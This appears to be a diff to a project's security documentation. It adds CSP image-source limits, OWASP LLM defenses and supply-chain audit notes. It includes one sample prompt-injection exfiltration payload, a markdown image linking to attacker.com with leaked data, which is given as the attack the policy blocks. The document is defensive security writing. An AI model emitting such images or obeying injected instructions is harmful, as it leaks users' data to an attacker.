@@ -28,6 +28,7 @@ The Express proxy server implements security-hardened headers using **Helmet.js*
    Restricts where scripts, stylesheets, fonts, and frame connections can originate. 
    * Authorized script sources: `'self'`, `'unsafe-inline'`, `'unsafe-eval'`, and Google Sign-in clients.
    * Authorized connection sources: `'self'` and Google Accounts.
+   * Authorized image sources (`img-src`): `'self'` and trusted CDNs, mitigating LLM-driven data exfiltration via malicious markdown images.
 2. **Frame / Clickjacking Protection**:
    `frameguard` is disabled in favor of strict, scoped `frameAncestors` directives. The app is forbidden from being loaded in an iframe on unauthorized external sites, but is explicitly permitted to embed inside approved domains:
    * `'self'`
@@ -35,6 +36,27 @@ The Express proxy server implements security-hardened headers using **Helmet.js*
    * `https://philgear.dev` (including subdomains like `spark.philgear.dev`)
 3. **CORS Configuration**:
    Cross-Origin Resource Sharing is enabled explicitly to prevent unauthorized browser-level API requests from arbitrary websites.
+
+---
+
+## 🛡️ LLM-Specific Defenses (OWASP Top 10)
+
+Aligned with the latest OWASP Top 10 for Large Language Model Applications, the following mitigations are critical:
+
+1. **Insecure Output Handling (XSS Mitigation)**: 
+   LLM output is treated as untrusted data. Before rendering LLM responses (which may include Markdown or HTML), the client must sanitize the payload (e.g., using `DOMPurify`) to neutralize Cross-Site Scripting (XSS) vectors.
+2. **Prompt Injection & Jailbreak Defense**: 
+   System prompts are heavily structured and isolated from user input where possible. (Note: Client-side scanning handles PII, but prompt injection defenses should ideally be reinforced server-side or via a secondary "guardrail" LLM).
+3. **Data Exfiltration Prevention**:
+   Strict CSP `img-src` directives prevent an attacker from using prompt injection to force the LLM to render an image pointing to an attacker-controlled domain (e.g., `![alt](https://attacker.com/leak?data=...)`).
+
+---
+
+## 📦 Supply Chain Security
+
+To protect against rising supply-chain attacks (e.g., compromised NPM packages):
+* Regular dependency audits are enforced (e.g., `npm audit`, Dependabot).
+* Package versions should be strictly pinned in production to avoid unexpected execution of malicious patches.
 
 ---
 
